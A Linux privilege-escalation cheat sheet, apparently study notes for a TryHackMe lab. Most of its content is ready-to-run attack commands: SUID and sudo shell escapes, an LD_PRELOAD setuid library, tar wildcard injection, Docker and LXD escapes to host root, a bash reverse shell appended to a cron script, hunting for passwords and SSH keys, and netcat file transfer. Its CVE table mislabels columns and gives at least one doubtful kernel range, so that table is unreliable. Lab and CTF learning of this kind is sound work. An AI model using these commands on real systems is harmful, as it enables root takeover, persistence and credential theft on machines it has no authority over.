# Privilege Escalation Cheat Sheet

## 🚀 Quick Commands

### System Info
```bash
uname -a                    # Kernel version
cat /etc/os-release         # Distribution
id                          # User info
whoami                      # Current user
groups                      # User groups
```

### SUID Files
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null
```

### Sudo
```bash
sudo -l                     # What can I run as sudo?
sudo -V | grep "Sudo version"
```

### Kernel
```bash
uname -r                    # Kernel version
cat /proc/version
searchsploit "Linux Kernel $(uname -r)"
```

### Capabilities
```bash
getcap -r / 2>/dev/null
getcap /path/to/file
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ weekly/ monthly/
cat /var/spool/cron/crontabs/root
```

### Writable Files
```bash
find / -writable -type f 2>/dev/null
find /etc -writable -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null
```

### Network
```bash
ip addr
netstat -tulpn
ss -tulpn
```

### Password Hunting
```bash
grep -ri "password" /home/
grep -ri "password" /etc/
cat ~/.bash_history
cat ~/.zsh_history
```

### SSH Keys
```bash
find / -name "id_rsa*" 2>/dev/null
find / -name "id_dsa*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

## 💥 Common Exploits

### SUID Exploits
```bash
# nmap
nmap --interactive
!sh

# vim
vim -c ':!sh'
# or in vim: :shell

# less/more
!sh

# find
find / -exec /bin/sh \; -quit

# bash/sh
./bash -p
./sh -p

# python/python3
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# perl
perl -e 'exec "/bin/sh -p"'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); system("/bin/sh");'

# ruby
ruby -e 'exec "/bin/sh -p"'

# nano
nano -> ^R ^X reset; sh 1>&0 2>&0
```

### Sudo Exploits
```bash
# Full sudo access
sudo su
sudo -i
sudo bash -p

# Specific binary
sudo -u root /bin/bash

# LD_PRELOAD (if env_keep)
sudo LD_PRELOAD=/tmp/lib.so <command>
# Create lib.c:
# void _init() { setuid(0); system("/bin/sh"); }
# gcc -fPIC -shared -o /tmp/lib.so lib.c

# Wildcard injection
# If script uses: tar czf /backup.tar.gz *
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=/bin/bash"
# Wait for cron to run
```

### Capabilities Exploits
```bash
# CAP_SETUID + ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
./binary_with_cap_setuid

# CAP_SYS_ADMIN
# Can mount filesystems, load modules, etc.

# CAP_DAC_OVERRIDE
# Read/write files regardless of permissions
```

### Cron Exploits
```bash
# Writable cron script
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /etc/cron.daily/script

# Writable cron.d directory
echo '* * * * * root /tmp/malicious.sh' > /etc/cron.d/00exploit

# PATH manipulation
# If cron uses relative path
cp /bin/bash /tmp/ls
export PATH=/tmp:$PATH
```

### Docker Escape
```bash
# Docker group member
docker run -v /:/mnt -it ubuntu chroot /mnt bash
docker run -v /root:/root -it ubuntu bash

# Privileged container
# Mount host filesystem
fdisk -l
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Docker socket mounted
docker run -v /var/run/docker.sock:/var/run/docker.sock \
           -it ubuntu bash
# Then spawn privileged container from inside

# LXD group
# On attacker: lxd init
# lxc image import vulnerable.tar.gz --alias vulnerable
# lxc launch vulnerable exploit -c security.privileged=true
# lxc exec exploit /bin/bash
# mount /dev/sda1 /mnt/root
```

## 🔍 Enumeration Checklist

- [ ] System info and kernel version
- [ ] User info and groups (docker, lxd, wheel, sudo, admin)
- [ ] SUID binaries
- [ ] Sudo permissions
- [ ] Kernel vulnerabilities (searchsploit)
- [ ] Capabilities
- [ ] Cron jobs
- [ ] Writable files and directories
- [ ] SSH keys
- [ ] Passwords in history files
- [ ] Config files (web, DB, SSH)
- [ ] Environment variables
- [ ] Mounted filesystems
- [ ] Network services
- [ ] Docker/LXC containers
- [ ] Readable /root directory
- [ ] Readable /etc/shadow

## 📚 Important CVEs

| CVE | Name | Kernel Range |
|-----|------|--------------|
| CVE-2016-5195 | Dirty COW | 2.6.22 - 4.6.0 |
| CVE-2021-4034 | Pkexec | All versions |
| CVE-2022-0847 | Dirty Pipe | 5.8 - 5.10 |
| CVE-2019-18634 | Sudo 1.7.1-1.8.31p2 | 1.7.1 - 1.8.31p2 |
| CVE-2019-14287 | Sudo < 1.8.28 | < 1.8.28 |
| CVE-2017-1000112 | Linux Kernel | 2.6.18 - 4.8.0 |
| CVE-2017-5123 | waitid() | 4.13 |
| CVE-2017-16995 | ebpf | 4.13 - 4.15 |

## 🛠️ Tools

```bash
# Enumeration
LinPEAS.sh / LinEnum.sh
pspy (for cron jobs)

# Exploit search
searchsploit
Exploit-DB

# Compile exploits
gcc -o exploit exploit.c
gcc -static -o exploit exploit.c

# Transfer files
nc -lvp PORT < file   # Receiver
nc IP PORT > file      # Sender

# TTY
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## 🎯 TryHackMe LinuxPrivEsc Tips

1. Start with full enumeration
2. Check kernel exploits first (quick wins)
3. Look for misconfigured sudo
4. Check SUID binaries with GTFOBins
5. Examine cron jobs
6. Hunt for credentials
7. Check capabilities
8. Don't forget environment variables
9. Look for writable files in critical paths
10. Check for container escape opportunities

## 📖 Resources

- GTFOBins: https://gtfobins.github.io/
- Exploit-DB: https://www.exploit-db.com/
- HackTricks: https://book.hacktricks.xyz/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
